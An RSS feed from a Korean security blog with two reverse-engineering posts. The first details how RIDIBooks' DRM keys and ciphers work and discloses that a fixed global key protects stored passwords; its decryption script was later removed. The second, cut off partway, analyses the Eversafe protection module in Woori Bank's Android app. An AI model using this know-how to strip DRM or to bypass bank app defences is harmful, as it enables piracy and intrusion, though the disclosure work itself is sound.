<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>0x90</title>
	<atom:link href="https://www.bpak.org/blog/feed/" rel="self" type="application/rss+xml" />
	<link>https://www.bpak.org/blog</link>
	<description>Computer Security, Life, and others</description>
	<lastBuildDate>Fri, 18 May 2018 03:07:36 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>hourly</sy:updatePeriod>
	<sy:updateFrequency>1</sy:updateFrequency>
	<generator>https://wordpress.org/?v=4.9.10</generator>
	<item>
		<title>[리디북스] 자신이 소유한 책 DRM 해제하기 (feat. 비밀번호 노출)</title>
		<link>https://www.bpak.org/blog/2018/04/%eb%a6%ac%eb%94%94%eb%b6%81%ec%8a%a4-%ec%9e%90%ec%8b%a0%ec%9d%b4-%ec%86%8c%ec%9c%a0%ed%95%9c-%ec%b1%85-drm-%ed%95%b4%ec%a0%9c%ed%95%98%ea%b8%b0-feat-%ec%9c%84%ed%97%98%ed%95%9c-%eb%b9%84%eb%b0%80/</link>
		<comments>https://www.bpak.org/blog/2018/04/%eb%a6%ac%eb%94%94%eb%b6%81%ec%8a%a4-%ec%9e%90%ec%8b%a0%ec%9d%b4-%ec%86%8c%ec%9c%a0%ed%95%9c-%ec%b1%85-drm-%ed%95%b4%ec%a0%9c%ed%95%98%ea%b8%b0-feat-%ec%9c%84%ed%97%98%ed%95%9c-%eb%b9%84%eb%b0%80/#comments</comments>
		<pubDate>Thu, 26 Apr 2018 05:32:28 +0000</pubDate>
		<dc:creator><![CDATA[Cai]]></dc:creator>
				<category><![CDATA[Hacking/Study]]></category>
		<category><![CDATA[Hacking/Tools]]></category>
		<category><![CDATA[Security]]></category>
		<category><![CDATA[DRM]]></category>
		<category><![CDATA[리디]]></category>
		<category><![CDATA[리디북스]]></category>
		<category><![CDATA[리디북스뷰어]]></category>
		<category><![CDATA[리버싱]]></category>
		<category><![CDATA[분석]]></category>
		<category><![CDATA[비밀번호]]></category>
		<category><![CDATA[암호화]]></category>
		<category><![CDATA[이북리더]]></category>

		<guid isPermaLink="false">https://www.bpak.org/blog/?p=2319</guid>
		<description><![CDATA[요즘 일로 너무 바쁜 나날을 보내고 있는데, 더이상 글을 안쓰면 1년을 넘길 것 같아서 뭐라도 투척하자는 마음으로 적는 글이다보니 기술적으로 깊게 짚고 넘어가기 보다는 간단하게 생존 신고 하는 용도의 포스팅을 하려 한다. 최근 1시간&#46;&#46;&#46;]]></description>
				<content:encoded><![CDATA[<p>요즘 일로 너무 바쁜 나날을 보내고 있는데, 더이상 글을 안쓰면 1년을 넘길 것 같아서 뭐라도 투척하자는 마음으로 적는 글이다보니 기술적으로 깊게 짚고 넘어가기 보다는 간단하게 생존 신고 하는 용도의 포스팅을 하려 한다. 최근 1시간 정도 스트레스를 풀기 위해 작업한 사이드 프로젝트에 대해서 설명하고 그 과정에서 발견한 것들과 산출물(?)을 공유한다.</p>
<p>얼마전 개발자들의 모임 공간인 &#8216;이상한모임&#8217; 슬랙의 한 채널에서 일어난 대화를 보고 문득 궁금증이 생겨 작업에 임했다.</p>
<blockquote>[&#8230;] 리디북스와 아마존 킨들을 둘 다 사용하는데, 리디에서 산 책을 아마존 기기로 옮길 수가 없어서 불편해요 [&#8230;]</blockquote>
<p>부끄럽지만(&#8230;) 나는 어릴때부터 책 읽는 것을 무척이나 싫어했다 &#8212; 아 물론, 만화책과 추리소설은 꽤 좋아했다. 독서는 습관인지, 나는 여전히 책 읽는데에 관심이 없다. 그래서 많이들 가지고 있는 이북리더 (<del>..김정은</del> e-book reader) 또한 사용해본적이 없고, 당연히 그에 따른 편함이나 불편함은 겪어본 경험이 없다. 그런데 위의 대화에 관심을 가지게 된 궁극적인 계기는 바로 그 불편함의 근원이 DRM이라는 것이었다.</p>
<p>그래서 잠깐 구글링을 통해 e-book에서 사용되는 포맷들과 각종 벤더들과 지원하는 리더들에 대해서 찾아봤다. 자세히 찾아본 것은 아닌지라 얼마나 정확한지는 모르겠으나, 보통 아마존을 통해 유통되고 있는 전자책들은 Adobe Digital Editions라는 것을 통해 DRM 설정이 되어있고, 같은 프로그램을 사용하여 본인이 소유한 컨텐츠라면 DRM을 해제하는 것이 가능해보였다. 다만, 국내 최대 전자책 유통사인 리디북스의 경우에는 자체적인 DRM 솔루션을 만들어 사용하고 있어 보였다. 그런 이유로 리디북스를 통해 구입한 컨텐츠를 자신의 다른 기기에 옮기는 것이 사실상 불가능했던 것이다.</p>
<p>그리하여, 리디북스의 리더를 분석해보기로 마음 먹는다.</p>
<p>&nbsp;</p>
<h2>리디북스 뷰어 구하기</h2>
<div id="attachment_2328" style="width: 577px" class="wp-caption aligncenter"><img class="wp-image-2328" src="https://www.bpak.org/blog/wp-content/uploads/2018/04/ridi_0.png" alt="리디북스 뷰어 다운로드" width="567" height="386" /><p class="wp-caption-text">리디북스 뷰어 다운로드</p></div>
<p>리더 프로그램을 구하는것은 그리 어렵지 않았다. 친절하게도 비로그인 유저에게도 다운로드 링크를 제공하고, 모바일과 PC 버전도 모두 지원하기 때문에 오히려 어떤 녀석으로 할까 고르는게 더 어려웠다 (<del>결정장애</del>). 물론, 나중에 테스트를 하기 위해서는 계정을 하나 만들긴 해야했지만.. 그건 성공한 후의 일이고, 우선 프로젝트의 난이도를 파악하는게 먼저였다.</p>
<p>난 맥 사용자이므로 테스트도 수월하게 할 겸 맥용 프로그램을 받아서 분석을 시작했다.</p>
<p>&nbsp;</p>
<h2>리디북스뷰어 분석하기</h2>
<p>앞서 말했듯이, 이번 글의 목표는 기술적인 분석보다는 같은 불편함을 가진 사람들이 좀 더 편하게 자신 소유의 컨텐츠를 관리할 수 있게 함이기에 자세한 내용은 적지 않겠다. 아래 DRM 해제 코드를 보면 어떤 식으로 DRM이 적용되고 관리되어 지는지 자명할 것이다.</p>
<p>우선 리디북스뷰어는 Qt 프레임워크를 사용하여 cross-platform을 목적으로 만들어져 있어서 운영체제에 상관 없이 코드베이스가 거의 비슷하다. 물론 이 말은 C++로 작성되어 있기에 분석하기에는 조금 껄끄럽다는 점이 있지만, 심볼과 함께라면 두려울 것이 없다! 리디북스에서 지원하는 컨텐츠 타입은 크게 세 가지이다: PDF, EPUB, 그리고 ZIP. 여기에서, ZIP 형태로 된 파일은 보통 만화책을 담을 때 사용된다.</p>
<p>분석을 진행하며 한 가지 흥미로웠던 점은 각 파일 형식마다 복호화 키를 만들어내는 방식과 사용하는 알고리즘이 조금씩 다르다는 점이었다. 아마 각 파일 형식을 맡은 개발자나 개발팀이 달랐던 듯 싶다. 또한, 아래에서 언급되는 설정 값들은 운영체제 마다 저장되는 공간이 다른데, 코드 내부적으로는 QSettings 클래스를 사용하므로 기본적으로 설정 파일이 저장되는 공간이 <a href="http://doc.qt.io/qt-5/qsettings.html#platform-specific-notes" target="_blank" rel="noopener">정해져있다</a>.</p>
<h4>공통</h4>
<p>어떤 형식이든 DRM 복호화를 위해서는 기기 고유의 값인 device_id를 사용한다. 이 값은 설정 파일에 존재하는데, 보안상의 이유로 암호화된 후 base64 인코딩 되어 저장되어 있다 &#8212; device.device_id 항목. 이 값을 비롯한 몇 가지 보안에 민감한 다른 설정 값들도 암호화 되어 있는데, 이 부분은 SimpleCrypt라는 녀석을 통해 구현했다. SimpleCrypt는 아래 DRM 해제 코드에도 (python으로 재구현한 버전) 포함되어있는데, 사실 아주 간단한 xor 인코딩이다.</p>
<p><img class="aligncenter wp-image-2335" src="https://www.bpak.org/blog/wp-content/uploads/2018/04/ridi_1-1.png" alt="" width="1051" height="115" /></p>
<p>클래스 생성 시 64-bit 정수형의 key를 받은 뒤, key split이라는 작업을 통해 해당 키를 key parts라고 불리는 조각들 8개로 나눈다. 그리고, 이 key parts들을 사용하여 암호화 또는 복호화를 진행한다. 독자가 예상했을 수 있겠지만, 여기에서 사용되는 &#8220;key&#8221; 값은 고정된 값이다. 좀 더 명시하자면, 특정 유저나 기기에 고정된 값이 아니라 <strong><span style="text-decoration: underline;">모든 리디북스 유저/기기에게 고정된 값</span></strong>이다. 이로 인해 발생하는 보안 위협은 아래 부록 섹션에서 설명하도록 한다.</p>
<p><img class="aligncenter wp-image-2336" src="https://www.bpak.org/blog/wp-content/uploads/2018/04/ridi_2.png" alt="" width="795" height="29" /></p>
<p>복호화 된 device_id는 UUID 형태의 문자열이다. 사실 이 값이 생성되는 방법과 값은 운영체제와 기기 마다 다르기 때문에 큰 의미는 없다. 단지 로그인 시점에서 리디북스의 유저 계정과 해당 device_id를 연결하고, 이 device_id를 토대로 생성된 암호키를 이용하여 암/복호화에 사용한다 &#8212; 코드에선 dec_key라고 불린다.</p>
<p>다운 받아진 컨텐츠 파일들이 존재하는 책장 (library) 디렉토리로 가보면, 암호화 되어있는 PDF/EPUB/ZIP 파일 말고도 .dat 파일이 존재한다. 이 .dat 파일은 각 컨텐츠마다 다른 암호키 (content_key)가 암호화 되어 저장된 파일이다. 이 파일은 위에서 계산한 dec_key를 SimpleCrypt의 키로 사용하여 복호화 할 수 있다. 이렇게 복호화 해서 나온 데이터는 한 번 더 암호화가 되어있는데, device_id의 첫 16바이트를 키로 이용하는 AES-128-ECB 알고리즘으로 암호화 되어있다.</p>
<p>복호화의 연속을 거치고 나면 결과적으로 어떤 hex 문자열이 나오는데, 그 중 &#8220;일부&#8221; 16바이트가 각각의 컨텐츠를 복호화하는데 쓰이는 content_key가 된다. 즉, 이 부분은 컨텐츠마다 다르다. 아래에서 언급하겠지만, ZIP 형식에서는 .dat 키 파일과 상관없이 device_id 만으로부터 content_key를 도출하여 사용한다 (????).</p>
<h4>PDF 형식</h4>
<p>위에서 나온 content_key를 AES-128-CBC 알고리즘의 키로 사용하여 복호화 한다. 이 때 사용되는 IV (initialization vector)는 널바이트 16개로 구성된 문자열이다. 복호화 한 후, 첫 16바이트는 hash 같아보이는 데이터로 실제 컨텐츠 데이터가 아니다. 잘라내고 읽으면 원본 컨텐츠 복호화 완료.</p>
<h4>EPUB 형식</h4>
<p>위에서 나온 content_key를 AES-128-ECB 알고리즘의 키로 사용하여 복호화 한다. 다른 메타데이터는 없어보이며, 그대로 복호화 된 데이터를 읽으면 원본 컨텐츠 복호화 완료.</p>
<h4>ZIP (만화책) 형식</h4>
<p><del>위에서 나온 con&#8230;</del> 전혀 content_key와는 관련없이 device_id 문자열의 부분을 16 바이트만큼 읽어서 키로 사용한다. 다만, ZIP 파일 자체가 암호화가 되어있는 형식이 아니라 압축을 풀면 나오는 각각의 파일을 AES-128-ECB로 복호화 해주면 된다. 그리고, 다시 파일들을 ZIP으로 묶어주면 원본 컨텐츠 복호화 완료.</p>
<p>&nbsp;</p>
<h2>리디북스 DRM 해제하기</h2>
<p>분석한 내용을 따라 DRM을 해제하는 스크립트를 작성하는 것은 어렵지 않았다. 각 형식에 맞춰서 파싱한 후, 복호화 작업을 해주고, 원하는 곳에 저장하면 끝이다. 최대한 Python 기본 내장 라이브러리들로만 구성하여서 작성하려고 노력했으나, AES 코드를 붙여넣기엔 가독성이 떨어져서 pycrypto 패키지 의존성이 하나 있다. 이는 <span class="lang:default decode:true crayon-syntax-inline" style="color: #ff9900; background-color: #666; border: solid 1px #333;">pip install pycrypto</span> 를 실행하면 해결된다.</p>
<p><script src="https://gist.github.com/brianairb/e1594667de2bf36762f322c59da6a648.js"></script></p>
<p>&nbsp;</p>
<p>사용하기전에 바꿔야할 부분은 크게 두 곳이다.</p>
<ol>
<li><strong>ENC_DEVICE_ID</strong> &#8211; base64로 되어있는 device_id 를 넣어야 하는데, 이건 macOS 기준 <span style="color: #ff0000; background-color: #eee; border: solid 1px #ccc;">/Users/&lt;username&gt;/Library/Preferences/com.ridibooks.Ridibooks.plist</span> 열어서 확인하면 된다.</li>
<li><strong>LIBRARY_PATH</strong> &#8211; 리디북스 앱 환경설정에 적혀있는 책장 경로이다. macOS 기준 디폴트 <span style="color: #ff0000; background-color: #eee; border: solid 1px #ccc;">/Users/&lt;username&gt;/Library/Application Support/RIDI/Ridibooks/&lt;ridi_username&gt;/library/</span> 이다.</li>
</ol>
<p>&nbsp;</p>
<p>원래 5명 내외의 개발자들에게만 편의를 위해 제공한 툴이라, 추가적인 사용법에 대한 질문은 따로 받지 않도록 하겠다. 언젠가 시간적으로 여유가 생기거나 하면 보통 사용자들도 이용하기 편한 macOS/Windows 앱으로 만들지도 모르겠지만, 아마도 그런 날은 오지 않겠지 ㅠㅠ.. (누군가가 나서서 해주셔도 됩니다ㅎㅎ)</p>
<p>&nbsp;</p>
<h2>테스트 결과 및 마치며&#8230;</h2>
<p><img class="aligncenter wp-image-2337" src="https://www.bpak.org/blog/wp-content/uploads/2018/04/ridi_3.png" alt="" width="713" height="338" /></p>
<p>리디북스가 지원하는 세 가지 형식에 대하여 샘플링해서 테스트 해본 결과, 모두 이상 없이 DRM이 해제되어 복호화 되었고 다른 유틸리티를 통해 해당 파일들을 불러들여올 수 있었다.</p>
<p>이 프로젝트는 기본적으로 &#8220;내가 돈 주고 산 물건에 대해서는 내 소유다&#8221;라는 아주 기본적이고도 직관적인 목표를 가지고 진행됐다. 간단하게 코드만 올려놔야지 했던 생각으로 글을 시작해서 결과적으로 분석+코딩한 시간 보다 더 긴 시간 동안 글을 작성하게 되어 당혹스럽다&#8230;</p>
<p>악용될 소지가 없지 않기에, 사용에 따른 법적 문제나 도의적 책임은 사용자 본인에게 있음을 알리며 글을 마친다.</p>
<p>&nbsp;</p>
<h2>부록. 위험에 처한 내 비밀번호 ㅠㅠ</h2>
<p>위에서 언급된 설정 파일을 살펴보면 device.device_id 말고도 다른 흥미로운 데이터들이 (암호화 되어) 저장되어 있다. 그 중 단연 돋보이는 것은 account.password와 account.id 이다. 시스템에 고스란히 저장되어 있는 내 비밀번호.. 암호화 되어있지만 어떻게 암호화 되어 있으며 안전할까?</p>
<p><img class="aligncenter wp-image-2338" src="https://www.bpak.org/blog/wp-content/uploads/2018/04/ridi_4.png" alt="" width="711" height="92" /></p>
<p>대답은 &#8216;아니오&#8217; 였다.</p>
<p><img class="aligncenter wp-image-2339" src="https://www.bpak.org/blog/wp-content/uploads/2018/04/ridi_5.png" alt="" width="761" height="41" /></p>
<p>device_id를 복호화 하는데 사용된 같은 &#8220;글로벌 공통 키&#8221;가 시스템에 저장되는 비밀번호에도 그대로 사용되고 있었던 것이다. 물론, 사용자의 시스템을 먼저 장악해야하기 때문에 큰 위협이 아니라고 할 수 있겠지만, 비밀번호의 hash 값이 아닌 실제 비밀번호 데이터가 복호화 가능한 형태로 들어가 있는 것은 꽤나 보안적으로 치명적인 디자인 결함이다.</p>
<p>이런식으로 저장되어 있는데에는 이유가 있다. 바로 &#8220;자동 로그인&#8221; 기능을 지원하기 위한 것. 자동 로그인 시, 로그인 URL에 POST 리퀘스트를 보내서 세션쿠키를 받아오는데, 이 때 유저이름과 비밀번호가 전송되게 된다 &#8212; 다행히 TLS 위에서 전송되기 때문에 안전하다&#8230;(하지만 인증서 갈아치우기로 SSL도 DPI를 하는 회사 시나리오에서는&#8230;?? 굳바이 마이 패스워드).</p>
<p>리디북스가 고객의 개인정보, 특히 그 중에서도 매우 민감한 비밀번호 데이터의 보안에 신경 쓴다면 실제 비밀번호가 아닌 salted hash 또는 PBKDF2를 사용하여 사용자를 인증하기 바란다.</p>
<p>&nbsp;</p>
<h2>업데이트</h2>
<ul>
<li><strong>2018/05/18:</strong> 리디북스의 개발자 분으로부터 최근 비공개 커뮤니티 등에서 리디북스에서 유출된 콘텐츠가 유통되는 사례가 접수됨에 따라 악용될 수 있는 스크립트 부분은 내려달라는 정중한 요청을 받아 해당 코드 부분은 삭제 조치 하였습니다.</li>
</ul>
]]></content:encoded>
			<wfw:commentRss>https://www.bpak.org/blog/2018/04/%eb%a6%ac%eb%94%94%eb%b6%81%ec%8a%a4-%ec%9e%90%ec%8b%a0%ec%9d%b4-%ec%86%8c%ec%9c%a0%ed%95%9c-%ec%b1%85-drm-%ed%95%b4%ec%a0%9c%ed%95%98%ea%b8%b0-feat-%ec%9c%84%ed%97%98%ed%95%9c-%eb%b9%84%eb%b0%80/feed/</wfw:commentRss>
		<slash:comments>41</slash:comments>
		</item>
		<item>
		<title>우리은행 + Eversafe == NULL</title>
		<link>https://www.bpak.org/blog/2017/08/%ec%9a%b0%eb%a6%ac%ec%9d%80%ed%96%89-eversafe-null/</link>
		<comments>https://www.bpak.org/blog/2017/08/%ec%9a%b0%eb%a6%ac%ec%9d%80%ed%96%89-eversafe-null/#comments</comments>
		<pubDate>Mon, 07 Aug 2017 23:00:54 +0000</pubDate>
		<dc:creator><![CDATA[Cai]]></dc:creator>
				<category><![CDATA[Security]]></category>
		<category><![CDATA[eversafe]]></category>
		<category><![CDATA[다이내믹시큐리티]]></category>
		<category><![CDATA[보안]]></category>
		<category><![CDATA[스타트업]]></category>
		<category><![CDATA[안드로이드]]></category>

		<guid isPermaLink="false">https://www.bpak.org/blog/?p=2248</guid>
		<description><![CDATA[이하 포스팅은 Eversafe의 동적 모듈이 작동하지 않는 상태에서 분석한 글 입니다. 자세한 상황은 글 말미를 확인하시기 바랍니다. (2017-08-10 08:57AM KST 추가) &#160; 이번 포스팅은 얼마전에 페이스북에서 불평을 토로했던 글의 확장판이다. 해당 글과 이번 글은&#46;&#46;&#46;]]></description>
				<content:encoded><![CDATA[<p>이하 포스팅은 Eversafe의 동적 모듈이 작동하지 않는 상태에서 분석한 글 입니다. 자세한 상황은 글 말미를 확인하시기 바랍니다.<br />
(2017-08-10 08:57AM KST 추가)</p>
<hr />
<p>&nbsp;</p>
<p>이번 포스팅은 얼마전에 <a href="https://www.facebook.com/brianairb/posts/10210263968619223" target="_blank" rel="noopener">페이스북에서 불평을 토로했던 글</a>의 확장판이다. 해당 글과 이번 글은 개인적인 생각임을 알린다.</p>
<p>글의 흥미를 위해 학생 시절 국어시간에 배운 5단 구성을 통해 이번 주제를 알아보도록 하자.</p>
<h2>발단</h2>
<p>사건의 발단은 생각보다 간단하다. 지인이 대화방에 올린 <a href="http://www.venturesquare.net/751882" target="_blank" rel="noopener">기사 링크</a>를 보고 &#8216;이건 무슨 신종 사기지?&#8217; 라는 생각이 들었다. 보안 필드에서, 아니, 어느 필드에서든 수학적인 증명을 통해 보이지 않는다면 100% 라는 수치는 사실상 숫자놀이에 불과하고 거짓이라는것은 기정사실이다. 하지만 특히 보안에서는 100%와 아닌것은 매우 큰 의미적 차이를 나타내기 때문에 정말 조심해서 사용하지 않으면 안되는 표현 중 하나이다. 또 보안에서 금기시 되는 단어 중 하나는 &#8220;절대&#8221; 인데, 이 기사는 무려 두 가지를 다 사용함으로써 어그로를 끄는데 성공했다.</p>
<p>그래도 일단 뭔지 알기도 전부터 욕부터 하면 나쁜사람이라고 배웠으니, &#8220;<a href="http://reckon.tistory.com/901" target="_blank" rel="noopener">benefit of the doubt</a>&#8220;을 줘보기로 하고 해당 솔루션 제작사 웹사이트를 방문했다.</p>
<div id="attachment_2256" style="width: 813px" class="wp-caption aligncenter"><img class="wp-image-2256" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/Screen-Shot-2017-08-06-at-4.46.52-PM.png" alt="" width="803" height="373" /><p class="wp-caption-text">무려 &#8220;세계 최초&#8221; 다이내믹 시큐리티 테크놀로지!</p></div>
<p>나는 원래 기술력이나 솔루션에 대해서 소위 &#8220;뻥카&#8221; 치는걸 별로 안좋아하는데, 그 이유는 해당 기술이나 연구에 대한 지식이 충분하지 않은 사람들이 들었을때 너무나 쉽게 현혹될 수 있기 때문이다 &#8212; 그리고 이 부분은 실제로 해당 기술/연구를 제대로 하는 사람들에게 불이익을 준다. 그냥 친구들끼리 장난으로 자랑하는것의 일환이라면 큰 상관이 없지만, 이게 국가에서 지원하는 펀드 프로그램이라던가 투자자가 투자하는 회사라면 사기가 된다. 물론, 마케팅에서는 &#8220;절대&#8221; &#8220;100%&#8221; 등과 같은 <em>자극적인</em> 표현을 사용했지만<em>, </em>웹사이트 자체에는 그런 말이 없으므로 사기보다는 과대포장이라고 표현하는게 맞을 수 있겠다. (투자자 앞 발표에서는 어떻게 피치했는지는 알 수 없지만, 이런 심심한 기술로 투자를 꽤나 받은걸로 봐서는 영업을 하는 사람이 말을 정말 잘하나보다. 부럽다.)</p>
<p>다시 본론으로 돌아와서, Everspin이라는 이 회사에서 제공하는 보안 솔루션은 크게 4가지 종류가 있다. 그 중에서 우리가 오늘 살펴볼 녀석은 첫번째로 소개된 Eversafe이다. 어플리케이션을 공급할 때 보통은 컴파일 된 코드들과 리소스 등을 정적으로 패키징해서 배포를 하기 때문에 공격자가 보안 모듈 등을 분석하기가 쉽고 그에 따라 우회 또는 2차 공격을 진행할 수 있다는 데에서 착안한 컨셉이다. &#8220;다이내믹&#8221; &#8220;사용 후 폐기&#8221; &#8220;일정 시간마다 변경&#8221; 등의 말들로 열심히 꾸며보고 있지만, 사실 이 컨셉은 이미 예전부터 알려져 있던 <a href="https://www.dhs.gov/science-and-technology/csd-mtd" target="_blank" rel="noopener">Moving Target Defense (MTD)</a>의 일종이다. 이 회사보다 몇 년은 더 일찍 관련 솔루션을 개발해온 업체들이 꽤나 있지만, 굳이 나열하진 않겠다. 구글 검색해보면 금방 나온다. (심지어 필자는 2013년 즈음 작업한 binary re-writing을 통한 런타임/동적 프로그램 보호 기법에 대한 특허도 가지고 있다.)</p>
<p>MTD는 다양한 레이어에서 시도할 수 있는데, 네트워크 단에서 적용하여 네트워크의 topology 또는 IP/MAC 주소 등을 수시로 변경하여 공격자가 항상 같은 패턴이나 타겟을 공격하기 어렵게 만들 수 있고, 바이너리/프로그램 단에서 적용하여 basic block re-ordering, runtime control flow mixing, instruction replacement 등 기존의 기능을 유지하되 여기저기 랜덤 요소를 주어 공격자가 이전에 노렸던 정적 타겟을 공격하기 어렵게 만드는 (cost를 높이는) 보안 기법이다.</p>
<p>자, 이제 세계 최초 타이틀은 아니라는걸 친절하게 설명해주었으니 실제로 어떻게 구현을 했는지, 정말 보안적으로 의미가 있는지를 확인해보자!</p>
<p>&nbsp;</p>
<h2>전개</h2>
<p>일단 Eversafe를 분석하기 위해서는 적용된 앱을 찾아야 했다. 다행히도 어렵지 않게 찾을 수 있었는데, 위의 기사를 보면 다음과 같이 설명한다.</p>
<blockquote><p>에버세이프는 사용자 정보를 보호해야 할 필요성이 있는 모든 서비스에 활용할 수 있다. [&#8230;] <span style="text-decoration: underline;">현재 우리은행이 에버세이프를 보안 앱으로 사용하고 있으며</span> 연내 은행 3곳이 추가로 에버세이프를 사용할 예정이라고 한다. [&#8230;] 에버스핀은 앞으로 공공 부분 솔루션 공급을 시작으로 금융권으로 공급을 확대할 계획이다.</p></blockquote>
<p>오호라. 우리은행이 사용하나보다. 난 우리은행 고객은 아니지만 테스트용 안드로이드 폰은 가진 사람이다 (후후). 우리은행의 &#8220;원터치개인&#8221; 앱을 다운로드 받고 추출해서 열어봤다.</p>
<p><center><img class="alignnone wp-image-2269" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_1.png" alt="" width="539" height="380" />  <img class="alignnone wp-image-2273" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_2.png" alt="" width="183" height="380" /></center>오. 정말로 Eversafe가 들어가 있다! 하지만 뭔가 보안 모듈 치고는 규모가 엄청 작다. 이럴때 다음으로 봐야할 곳은 native library 들이다. 역시 리버싱을 조금 귀찮게 하기 위하여 JNI를 사용한 전형적인 모습이다. 그래도 괜찮다, 우리에겐 IDA Pro가 있기 때문이다.</p>
<p>큰 구조를 파악하기 위해서 우선 apk안에 있는 <strong>kr.co.everspin.eversafe</strong> 패키지 클래스들을 살펴보기로 하자.</p>
<h4>Eversafe</h4>
<p>이 클래스는 거의 그냥 wrapper로 봐도 무방한데, 보다시피 constructor에서 몇 가지 멤버 변수들을 셋업해준 후 <em><strong>loadLibrary</strong></em>를 통해서 JNI 컴포넌트인 <em>libeversafe.so</em>를 로딩한다.<img class="wp-image-2277 aligncenter" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_3.png" alt="" width="367" height="566" /></p>
<p>또한, 나중에 <strong><em>EversafeHelper</em></strong> 객체가 초기화될 때 호출되는 <strong><em>freeze</em></strong> 메소드에서는 <strong><em>eversafeJni</em></strong> 멤버 변수를 <em>libeversafe.so</em> JNI 모듈에서 expose하고 있는 <strong><em>loadJni</em></strong> 함수를 호출한 결과값으로 저장한다. 알아두어야 할 것은 이제 자바에서 이 eversafeJni 객체를 통해서 native library에서 declare한 메소드들을 호출 할 수 있다는 점이다. register, launch, relaunch, setSharedData, getSharedData, option 등과 같은 메소드인데, 우리 입장에서는 그다지 흥미로운 메소드들은 아니다.</p>
<p><center><img class="wp-image-2280 alignnone" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_5.png" alt="" width="395" height="508" />     <img class="wp-image-2281 alignnone" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_6.png" alt="" width="457" height="330" /></center></p>
<h4>EversafeHelper</h4>
<p><strong><em>Eversafe</em></strong> 클래스보다 훨씬 코드가 많고 흥미로운 기능들이 구현되어 있는 부분을 가진 <strong><em>EversafeHelper</em></strong> 클래스다. 현재 Eversafe의 상태나 intent 등을 통해 받은 메세지들을 처리해주는 코드가 들어있다. 후반에 다시 이야기 하겠지만, Eversafe에서 &#8220;안티바이러스&#8221; 역할을 하는 부분도 있기 때문에 기기 내에 위협 요소가 발견되면 해당 정보를 저장하는 코드 또한 포함되어 있다. 이 역시 그냥 앱의 정상 행동을 위한 코드들이 대부분이므로 우리의 관심사와는 크게 상관이 없다.</p>
<p><img class="wp-image-2279 aligncenter" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_4.png" alt="" width="696" height="416" /></p>
<p>여기서 우리가 짚고 넘어가야할 부분은 <strong><em>EversafeHelper</em></strong>의 초기화 코드인 <strong><em>initialize</em></strong> 메소드다. 보다시피 위에서 언급한 Eversafe 객체의 <strong><em>freeze</em></strong> 메소드를 호출하고, 몇 가지 멤버 변수들을 셋업해준다. 그 중 하나는 <strong><em>registrationCode</em></strong>와 <strong><em>baseUrl</em></strong>인데, 웹사이트에 설명된 대로라면 서버에서 일정 시간마다 어떤 새로운 모듈을 받아오거나 할 것이므로 이 두 변수는 중요해보이니 기억해두도록 하자.</p>
<p>이를 확인하기 위해 간단한 스크립트를 만들어서 앱 내에서의 완성된 <strong><em>baseUrl</em></strong>에 어떤 값이 들어가 있는지, 그리고 앱에서 이것저것 클릭했을 때 어떤 URL 등을 참조하는지를 확인해보았다.</p>
<p><img class="aligncenter wp-image-2282" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_7.png" alt="" width="844" height="66" /></p>
<p>보다시피 <strong><em>baseURL</em></strong>은 <em>https://appsec.wooribank.com:4443/eversafe/6d7d2a5a-d288-e9fa-b6fe-94185e611030</em> 이고, 어느 시점에서 <em>/auth</em> 경로를 요청하는것을 볼 수 있다. 자 그럼 여기서 UUID처럼 생긴 저 헥스 값들은 무엇일까? 위의 코드를 살펴보면 쉽게 알 수 있는데, 바로 <strong><em>registrationCode</em></strong>다. 이 코드는 <strong><em>RegistrationCode</em></strong>라는 클래스 객체를 통해 생성된다. 그렇다면 이 클래스의 생성자는 어떻게 생겼을까.</p>
<p><img class="aligncenter wp-image-2283" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_8.png" alt="" width="972" height="250" /></p>
<p>위의 스크린샷에는 살짝 짤렸지만, registration code가 생성되는 규칙은 다음과 같다. 인자로 들어온 고유값 (organization id?)을 이용하며, &#8220;&lt;고유값&gt;,&lt;패키지 versionName&gt;(&lt;패키지 versionCode&gt;)&#8221;으로 만들어진 스트링을 MD5 해쉬한 헥스 값을, 8자리-4자리-4자리-4자리-12자리로 나눈다.</p>
<p>우리은행 앱의 <strong><em>MainActivity</em></strong>에서 초기화를 하며 Eversafe 객체들도 초기화를 하는데, 여기를 살펴보면 <strong><em>EverSafeHelper</em></strong>의 <strong><em>initialize</em></strong> 메소드를 호출할 때 들어오는 인자, 즉 <strong><em>RegistrationCode</em></strong> 생성자에 들어가는 고유값을 알 수 있게 된다. 여기서 사용되는 값은 &#8220;718E31DA0ED73B0B&#8221; 이다.</p>
<p><img class="aligncenter wp-image-2284" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_9.png" alt="" width="970" height="320" /></p>
<p>결과적으로 MD5 해쉬되는 스트링은 &#8220;718E31DA0ED73B0B,1.4.8(148)&#8221;이 되고, 이 문자열의 MD5 값은 &#8220;6d7d2a5ad288e9fab6fe94185e611030&#8243;이다. 위의 스크린샷 URL에서 보았던 &#8220;6d7d2a5a-d288-e9fa-b6fe-94185e611030&#8243;와 매칭한다는 것을 알 수 있다. 이걸 통해서 특정 패키지 버전이나 기관에 맞는 모듈을 다운받아서 실행하는가 보다 (라고 생각했지만, 나중에 더 큰 충격과 공포를 맛보게 된다).</p>
<p><img class="aligncenter wp-image-2285" style="border: 1px solid #ccc;" src="https://www.bpak.org/blog/wp-content/uploads/2017/08/eversafe_10.png" alt="" width="651" height="251" /></p>
